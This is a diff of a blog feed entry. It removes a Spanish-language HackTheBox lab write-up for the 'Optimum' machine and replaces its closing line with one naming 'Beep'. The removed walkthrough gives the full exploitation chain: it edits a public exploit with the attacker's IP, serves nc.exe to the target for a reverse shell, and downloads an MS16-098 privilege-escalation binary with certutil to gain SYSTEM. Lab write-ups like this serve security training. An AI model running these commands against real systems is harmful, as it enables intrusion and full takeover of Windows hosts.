-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ../exploit
-searchsploit &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; windows/remote/39161.py
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Luego de revisar el exploit, debemos modificar las líneas 35 y 36, ingresando la IP de nuestra máquina y el puerto por el cual vamos a estar por escucha a través de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vim 39161.py
-&lt;span class=&quot;c&quot;&gt;#MODIFICAR LINEA 35 Y 36&lt;/span&gt;
-ip_addr &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;10.10.14.2&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#local IP address&lt;/span&gt;
-local_port &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;4564&quot;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Local Port number&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Para que el exploit funcione debemos copiar la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; en la carpeta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;locate nc.exe
-&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; /usr/share/sqlninja/apps/nc.exe &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Activamos un servidor local &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt; por el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt;, para que el exploit pueda consultar y cargar el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; que copiamos anteriormente.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Generamos un listener con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rlwrap&lt;/code&gt; para tener mayor estabilidad en la shell que vamos a obtener.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rlwrap nc &lt;span class=&quot;nt&quot;&gt;-lvnp&lt;/span&gt; 4564
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Procedemos a ejecutar el exploit junto con la IP víctima y el puerto.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python 39161.py 10.10.10.8 80
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;em&gt;NOTA: El exploit se debe ejecutar dos veces, la primera para cargar el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nc.exe&lt;/code&gt; y la segunda para entablar una reverse shell&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;
-&lt;img src=&quot;/assets/images/optimum/03-page.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ESCALADA DE PRIVILEGIOS&lt;/h2&gt;
-
-&lt;p&gt;Ahora que nos encontramos dentro de la máquina víctima, vamos a realizar un método mínimamente ruidoso para la explotación de vulnerabilidades con exploits públicos, por lo que vamos a hacer uso de la utilidad &lt;a href=&quot;https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py&quot;&gt;Windows-Exploit-Suggester&lt;/a&gt; del github de &lt;a href=&quot;https://github.com/AonCyberLabs&quot;&gt;AonCyberLabs&lt;/a&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vamos a actualizar la base de vulnerabilidades con el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-u&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python2 windows-exploit-suggester.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Luego de obtener nuestra base de vulnerabilidades al día, vamos a ejecutar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systeminfo&lt;/code&gt; en la máquina víctima y copiamos el output en un archivo de nuestra máquina denominado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systeminfo.txt&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vim systeminfo.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Debido a que el exploit se encuentra en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python2&lt;/code&gt;, procedemos a generar un entorno virtualizado por medio de la utilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;virtualenv&lt;/code&gt; y activarlo por medio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;source&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;virtualenv &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; python2 privesc&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;source &lt;/span&gt;privesc/bin/activate
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Para que el exploit funcione correctamente, vamos a desinstalar la versión actual de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xlrd&lt;/code&gt; y realizamos la instalación de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xlrd==1.2.0&lt;/code&gt;, todo por medio de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pip2&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;pip2 uninstall xlrd&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pip2 &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;xlrd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;1.2.0
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora que ya tenemos todos los requisitos, podemos ejecutar el script asignando la base de vulnerabilidades actualizada anteriormente con el parámetro &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-d&lt;/code&gt; y la información extraída del &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;systeminfo&lt;/code&gt; ejecutada en la máquina víctima.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python2 windows-exploit-suggester.py &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; 2022-08-04-mssb.xls &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; systeminfo.txt
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;En el output del exploit, nos muestra las vulnerabilidades que pueden ser potencialmente explotadas, según la información suministrada en la enumeración de la máquina víctima, en este caso nos centramos en la vulnerabilidad &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MS16-098&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;E] MS16-098: Security Update &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Windows Kernel-Mode Drivers &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3178466&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - Important
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;   https://www.exploit-db.com/exploits/41020/ &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; Microsoft Windows 8.1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - RGNOBJ Integer Overflow &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;MS16-098&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;escalada-por-ms16-098&quot;&gt;ESCALADA POR MS16-098&lt;/h2&gt;
-
-&lt;p&gt;Descargamos el binario &lt;a href=&quot;https://github.com/offensive-security/exploitdb-bin-sploits/blob/master/bin-sploits/41020.exe&quot;&gt;41020.exe&lt;/a&gt; de &lt;a href=&quot;https://github.com/offensive-security&quot;&gt;Offensive Security&lt;/a&gt; que nos va a permitir tener acceso a un usuario con permisos de administración en la máquina víctima.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://github.com/offensive-security/exploitdb-bin-sploits/blob/master/bin-sploits/41020.exe
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Generamos un servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http&lt;/code&gt; con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python&lt;/code&gt; por el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;80&lt;/code&gt; para cargar el binario a la máquina víctima.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;En la máquina objetivo accedemos a la carpeta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Windows/Temp&lt;/code&gt; y creamos una nueva carpeta denominada &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;priv&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;emp
-&lt;span class=&quot;nb&quot;&gt;mkdir &lt;/span&gt;priv
-&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;priv
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;certutil.exe&lt;/code&gt; realizamos la carga del binario y le asignamos el nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit.exe&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;certutil.exe &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-urlcache&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-split&lt;/span&gt; http://10.10.14.2/41020.exe exploit.exe
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Finalmente ejecutamos el exploit y obtenemos acceso a el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt authority/system&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exploit.exe
-&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;nt authority/system
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;¡Listo! Logramos una shell con un usuario administrador.&lt;/p&gt;
-
-&lt;h2 id=&quot;flags&quot;&gt;FLAGS&lt;/h2&gt;
-
-&lt;p&gt;Lo único que nos queda es leer las banderas de user y root. Pueden ver la flag con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;type&lt;/code&gt;, pero para hacerlo más retador solo dejaré los primeros 10 caracteres de la flag.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;C:&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
-&lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; /b/s user.txt&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
-C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;ostas&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ser.txt.txt
-&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; /P &lt;span class=&quot;nv&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;&lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ostas&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;esktop&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ser.txt.txt&quot;&lt;/span&gt;
-echo.%user:~1,10%
-0c39409d7b
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; /b/s root.txt
-C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;dministrator&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;oot.txt
-&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; /P &lt;span class=&quot;nv&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;&lt;span class=&quot;s2&quot;&gt;&quot;C:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;sers&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;dministrator&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;esktop&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;oot.txt&quot;&lt;/span&gt;
-echo.%root:~1,10%
-1ed1b36553
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;¡Hemos logrado completar la máquina &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;optimum&lt;/code&gt; de HackTheBox!&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/optimum/04-finish.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Optimum" /><summary type="html">Vamos a resolver la máquina Optimum de HackTheBox. ¡Let's hack!</summary></entry></feed>
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;.&lt;/p&gt;</content><author><name>BAST1ANT1C</name></author><category term="Writeup" /><category term="Beep" /><summary type="html">Vamos a resolver la máquina Beep de HackTheBox. ¡Let's hack!</summary></entry></feed>
